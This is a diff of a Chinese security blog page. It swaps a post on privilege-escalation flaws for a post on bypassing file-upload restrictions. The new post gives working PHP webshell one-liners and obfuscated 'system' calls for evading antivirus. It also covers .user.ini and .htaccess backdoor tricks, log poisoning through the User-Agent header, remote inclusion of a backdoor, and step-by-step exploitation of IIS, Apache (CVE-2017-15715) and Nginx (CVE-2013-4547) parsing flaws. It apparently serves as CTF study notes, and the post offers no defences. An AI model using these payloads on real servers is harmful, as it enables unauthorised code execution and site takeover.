@@ -4,15 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="逻辑越权介绍, 白芨的小屋">
-    <meta name="description" content="逻辑漏洞-越权介绍越权：越-&amp;gt;超越；权-&amp;gt;权限
-分类：水平越权​    获取到同一级别其他用户的权限
-垂直越权获取到不同级别的使用者的权限
-
-向上越权-&amp;gt;下级获得上级权限
-向下越权-&amp;gt;上级获得下级(隐私)权限
-
-eg">
+    <meta name="keywords" content="文件上传绕过, 白芨的小屋">
+    <meta name="description" content="文件上传漏洞-限制绕过1、前端javascript验证一般只校验后缀名，利用f12可修改前端js代码绕过。
+2、MIME文件类型检测修改content-type为允许上传类型进行绕过。
+常见MIME类型
+超文本标记语言文本 .html,.h">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -24,7 +20,7 @@ eg">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>逻辑越权介绍 | 白芨的小屋</title>
+    <title>文件上传绕过 | 白芨的小屋</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -316,12 +312,12 @@ eg">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/upload.jpeg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">逻辑越权介绍</h1>
+                    <h1 class="description center-align post-title">文件上传绕过</h1>
                 </div>
             </div>
         </div>
@@ -453,7 +449,7 @@ eg">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-15
+                    2022-02-22
                 </div>
                 
 
@@ -462,7 +458,7 @@ eg">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    594
+                    1.7k
                 </div>
                 
 
@@ -482,32 +478,158 @@ eg">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="逻辑漏洞-越权介绍"><a href="#逻辑漏洞-越权介绍" class="headerlink" title="逻辑漏洞-越权介绍"></a>逻辑漏洞-越权介绍</h1><p>越权：越-&gt;超越；权-&gt;权限</p>
-<h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>​    获取到同一级别其他用户的权限</p>
-<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>获取到不同级别的使用者的权限</p>
-<ul>
-<li>向上越权-&gt;下级获得上级权限</li>
-<li>向下越权-&gt;上级获得下级(隐私)权限</li>
+                <h1 id="文件上传漏洞-限制绕过"><a href="#文件上传漏洞-限制绕过" class="headerlink" title="文件上传漏洞-限制绕过"></a>文件上传漏洞-限制绕过</h1><h2 id="1、前端javascript验证"><a href="#1、前端javascript验证" class="headerlink" title="1、前端javascript验证"></a>1、前端javascript验证</h2><p>一般只校验后缀名，利用f12可修改前端js代码绕过。</p>
+<h2 id="2、MIME文件类型检测"><a href="#2、MIME文件类型检测" class="headerlink" title="2、MIME文件类型检测"></a>2、MIME文件类型检测</h2><p>修改<strong>content-type</strong>为允许上传类型进行绕过。</p>
+<p>常见MIME类型</p>
+<pre class="line-numbers language-none"><code class="language-none">超文本标记语言文本 .html,.html -&gt;   text&#x2F;html
+
+JPEG图形 .jpeg,.jpg -&gt;   image&#x2F;jpeg
+
+普通文本 .txt -&gt;   text&#x2F;plain
+
+GIF图形 .gif -&gt;   image&#x2F;gif
+
+PNG图形 .png -&gt;   image&#x2F;png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="3、-user-ini（php特性）"><a href="#3、-user-ini（php特性）" class="headerlink" title="3、.user.ini（php特性）"></a>3、.user.ini（php特性）</h2><p><strong>php.ini</strong>：php全局配置文件，对整个web服务起作用；而**.user.ini<strong>和</strong>.htaccess<strong>一样是目录的配置文件，</strong>.user.ini<strong>就是</strong>用户自定义的一个php.ini**，我们可以利用这个文件来构造后门和隐藏后门。</p>
+<p>利用方式：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">//.user.ini
+auto_prepend_file=test.png						 //包含在文件头
+auto_append_file = test.png            //包含在文件尾（当文件调用的有exit()时该设置无效）
+// test.png：
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
+ 
+#补充: .user.ini两条语句有一条即可，类似于文件包含。其中文件会被当作脚本语言进行执行。
+# .user.ini 实时生效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用前提：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 服务器脚本语言为PHP</span>
+<span class="token comment"># 服务器使用CGI／FastCGI模式 </span>
+<span class="token comment"># 上传目录下要有可执行的php文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="4、文件内容进行了过滤"><a href="#4、文件内容进行了过滤" class="headerlink" title="4、文件内容进行了过滤"></a>4、文件内容进行了过滤</h2><p><strong>利用php短标签绕过</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span> <span class="token keyword">echo</span> <span class="token string single-quoted-string">'123'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  													#前提是开启配置参数short_open_tags=on
+<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token delimiter important">?></span></span>  等价于 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token delimiter important">?></span></span> 		#不需要开启参数设置
+&lt;% echo '123';%>   									#开启配置参数asp_tags=on，并且只能在7.0以下版本使用
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">echo <span class="token string">'123'</span><span class="token punctuation">;</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> #不需要修改参数开关，但是只能在7.0以下可用
+
+#根据过滤内容更换表达式
+#例：
+<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx'</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>							#利用system命令执行
+<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`nl ../f*`</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>								#利用反引号``命令执行
+<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>						#利用&#123;&#125;代替[]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>利用日志包含绕过, 图片内容</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">#包含默认日志，日志记录UA头，UA头写后门代码  
+.user.ini：auto_prepend_file=test.png
+test.png：<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token delimiter important">?></span></span> #因为log被过滤了。所以用拼接绕过
+#抓包，在UA头中写入木马<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>校验文件头是否为图片格式文件</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"># gif文件头 ->   GIF89A
+.user.ini：GIF89A auto_prepend_file=test.png
+test.png：GIF89A <span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>利用远程包含IP转换地址后门调用执行突破<code>.</code>的过滤</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">.user.ini auto_prepend_file=png
+png <span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string single-quoted-string">'http://2016886???/'</span><span class="token operator">></span>
+
+<span class="token comment">#服务器中写入后门文件、利用远程包含访问服务器ip、因 ‘.’ 被过滤，需将ip转化为int形式进行包含</span>
+<span class="token comment">#转换地址：https://www.bejson.com/convert/ip2int/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>直接利用.user.ini远程包含突破上传删除</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">auto_prepend_file<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//2016886???/</span>
+
+<span class="token comment">#当.user.ini可以正常上传，被包含文件上传后被删除时，可利用.user.ini直接包含远程后门进行突破上传</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="5、利用-htaccess绕过"><a href="#5、利用-htaccess绕过" class="headerlink" title="5、利用.htaccess绕过"></a>5、利用.htaccess绕过</h2><ul>
+<li>.htaccess默认不支持nginx，设置后支持</li>
+<li>.htaccess可以通过设置实现文件解析配置将.png后缀的文件解析成php</li>
 </ul>
-<p><strong>eg</strong>：一个网站、管理员admin，可以增添用户、删除用户…</p>
-<p>​        用户:user-1,user-2…可发布公开内容，隐私内容等等。</p>
-<p><strong>水平越权</strong>：user-1拿到user-2的权限，可查看user-2发布的隐私内容，以user-2的身份进行一些非法操作。</p>
-<p><strong>垂直越权</strong>：</p>
-<p>向上越权：user-1拿到admin的权限，非法进行增删用户等操作。</p>
-<p>向下越权：admin拿到user-1或user-2的权限，进行非法查看隐私内容等操作</p>
-<h2 id="验证："><a href="#验证：" class="headerlink" title="验证："></a>验证：</h2><p>1、请求中不存在参数，只用cookie进行身份验证，则不可越权；</p>
-<p>2、请求中存在参数，且参数中的某些值可能是辨识用户身份的<strong>唯一</strong>值如employeeID、departmentID、ID等。</p>
-<p><strong>水平越权</strong>：用两个浏览器同时注册user-1，user-2两个普通用户。在相同界面同时进行抓包对比，寻找代表其身份的参数，修改参数进行重放，若访问成果，则存在水平越权。</p>
-<p><strong>垂直越权</strong>：</p>
-<p>以向上越权为例：抓包寻找辨识用户身份的唯一值，替换为管理员的参数，进行重放，若访问成功，则存在垂直越权。</p>
-<p><strong>问题：</strong>如何寻找代表管理员的身份唯一值？</p>
-<p>1、若该值为有规律数字可进行枚举。2、可在站点寻找是否有可利用信息进行构造。3、下载站点源代码进行本地搭建、注册管理员账户进行测试。</p>
-<h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>可用burpsuite 插件authz进行测试验证。</p>
-<h2 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h2><p>执行关键操作时验证用户身份，判断其是否具有操作权限。</p>
-<p>对标识用户唯一身份的参数进行加密，防止用户进行枚举。</p>
-<p>服务器对每个页面链接进行权限判断。</p>
-<p>用户登录后不再以客户端用户提交的登录信息作为依据，而是以会话中服务端存在的已登陆用户信息为准。</p>
-<p>最小权原则。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#首先上传.htaccess</span>
+AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>png   	<span class="token comment">#将.png后缀的文件解析 成php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="6、免杀绕过（文件上传）"><a href="#6、免杀绕过（文件上传）" class="headerlink" title="6、免杀绕过（文件上传）"></a>6、免杀绕过（文件上传）</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'syste'</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac ../flagaa.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"s#y#s#t#e#m"</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="7、上传-日志包含绕过"><a href="#7、上传-日志包含绕过" class="headerlink" title="7、上传-日志包含绕过"></a>7、上传-日志包含绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"># 访问地址，UA头写入后门：<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
+# 上传.user.ini包含日志：auto_prepend_file=/var/log/nginx/access.log
+# 构造.user.ini利用条件：上传index.php 内容随意
+# 蚁剑连接 index.php就可以了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="8、中间件文件解析"><a href="#8、中间件文件解析" class="headerlink" title="8、中间件文件解析"></a>8、中间件文件解析</h2><h3 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a><strong>IIS解析漏洞</strong></h3><ul>
+<li><h4 id="文件解析："><a href="#文件解析：" class="headerlink" title="文件解析："></a>文件解析：</h4></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">x.asp;.x.jpg
+iis5.x&#x2F;6.0中：文件名分号后不被解析：x.asp;.x.jpg可当作x.asp执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ul>
+<li><h4 id="目录解析："><a href="#目录解析：" class="headerlink" title="目录解析："></a>目录解析：</h4></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">iis5.x&#x2F;6.0目录解析：*.asp、*.asa、.cer、.cdx文件夹内任意文件当作asp执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>上传文件固定文件名、目录无法创建，以上解析漏洞无用武之地。</strong></p>
+<ul>
+<li><h4 id="IIS7-X与Nginx解析漏洞一致"><a href="#IIS7-X与Nginx解析漏洞一致" class="headerlink" title="IIS7.X与Nginx解析漏洞一致"></a>IIS7.X与Nginx解析漏洞一致</h4></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">iis 7.0&amp;7.5 默认Fast-CGI开启，直接在url中图片地址后面输入&#x2F;x.php，会把正常图片当成php解析<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a><strong>Apache解析漏洞</strong></h3><ul>
+<li><h4 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）黑名单绕过"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）黑名单绕过" class="headerlink" title="Apache  HTTPD 换行解析漏洞（CVE-2017-15715）黑名单绕过"></a>Apache  HTTPD 换行解析漏洞（CVE-2017-15715）黑名单绕过</h4></li>
+</ul>
+<p>Apache HTTPD是一款<strong>HTTP服务器</strong>，它可以通过<strong>mod_php</strong>来运行PHP网页。其<strong>2.4.0~2.4.29</strong>版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<p>原理：解析漏洞根本原因就是**$** 这个符号，这个符号在<strong>正则表达式</strong>中是<strong>匹配字符串中结尾</strong>的位置，<strong>利用换行符使$ 与其匹配</strong>从而<strong>绕过    黑名单机制</strong>实现文件上传。</p>
+<p>验证逻辑对上传的文件正则匹配验证后缀名是否包含了php，因为解析漏洞的存在，这里<strong>不会过滤php%0a</strong>。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 利用方式：</span>
+在上传时抓包，在x<span class="token operator">.</span>php （注意：非filename<span class="token operator">=</span>x<span class="token operator">.</span>php）中hex编码的php后一个插入<span class="token number">0</span>A。
+<span class="token comment"># 修改十六进制代码，可在php后加一个空格，将空格的十六进制20修改为0A</span>
+上传成功访问ip<span class="token operator">/</span>x<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>A页面回显出php的相关信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<ul>
+<li><h4 id="Apache-HTTPD-未知后缀解析漏洞"><a href="#Apache-HTTPD-未知后缀解析漏洞" class="headerlink" title="Apache HTTPD 未知后缀解析漏洞"></a>Apache HTTPD 未知后缀解析漏洞</h4></li>
+</ul>
+<!--该漏洞与版本无关、属于用户配置不当造成的解析漏洞。-->
+
+<p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">AddHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>php
+  
+<span class="token comment"># 解释：让Apache把PHP文件交给php_moudle解析，但是它与sethandler的区别是它的后缀不是用正则去匹配。所以在文件名的任何位置匹配到php，他都会让php_module解析</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过<strong>上传白名单</strong>的解析漏洞。</p>
+<p><strong>补充：利用此方法文件名需要基于本地上传为准</strong></p>
+<h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><ul>
+<li><h4 id="解析漏洞-nginx-conf配置不当"><a href="#解析漏洞-nginx-conf配置不当" class="headerlink" title="解析漏洞-nginx.conf配置不当"></a>解析漏洞-nginx.conf配置不当</h4></li>
+</ul>
+<!--该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞-->
+
+<p>在访问的文件后增加<code>/.php</code>后缀，被解析成PHP文件：</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;uploadfiles&#x2F;nginx.png&#x2F;.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li><h4 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h4></li>
+</ul>
+<p><strong>影响版本：</strong>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
+<p>这个漏洞和代码执行没有太大关系，其主要原因是<strong>错误地解析了请求的URI</strong>，<strong>错误地获取到用户请求的文件名</strong>，导致出现权限绕过、代码执行的连带影响。</p>
+<p><strong>利用方式：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">1、我们上传一个“1.gif ”，注意后面的空格。
+	1.gif: &lt;?php phpinfo();?&gt;
+2、访问http:&#x2F;&#x2F;ip:8080&#x2F;uploadfiles&#x2F;1.gif[0x20][0x00].php，即可发现PHP已被解析。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
@@ -534,7 +656,7 @@ eg">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://jaasenyi.github.io/2022/01/15/luo-ji-yue-quan/">http://jaasenyi.github.io/2022/01/15/luo-ji-yue-quan/</a>
+                    <a href="http://jaasenyi.github.io/2022/02/22/wen-jian-shang-chuan-rao-guo/">http://jaasenyi.github.io/2022/02/22/wen-jian-shang-chuan-rao-guo/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -747,17 +869,17 @@ eg">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/15/wen-jian-bao-han/">
+                <a href="/2022/02/22/wen-jian-shang-chuan-rao-guo/">
                     <div class="card-image">
                         
+                        <img src="/medias/banner/upload.jpeg" class="responsive-img" alt="文件上传绕过">
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="文件包含漏洞介绍">
-                        
-                        <span class="card-title">文件包含漏洞介绍</span>
+                        <span class="card-title">文件上传绕过</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -767,9 +889,9 @@ eg">
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -778,6 +900,7 @@ eg">
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -796,12 +919,13 @@ eg">
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/15/csrf/">
+                <a href="/2022/01/21/sql/">
                     <div class="card-image">
                         
-                        <img src="/medias/banner/csrf.png" class="responsive-img" alt="CSRF漏洞介绍">
                         
-                        <span class="card-title">CSRF漏洞介绍</span>
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="SQL">
+                        
+                        <span class="card-title">SQL</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -812,23 +936,15 @@ eg">
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-21
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            白芨
+                            BaiJi
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">
-                        <span class="chip bg-color">web安全基础</span>
-                    </a>
-                    
                 </div>
                 
             </div>
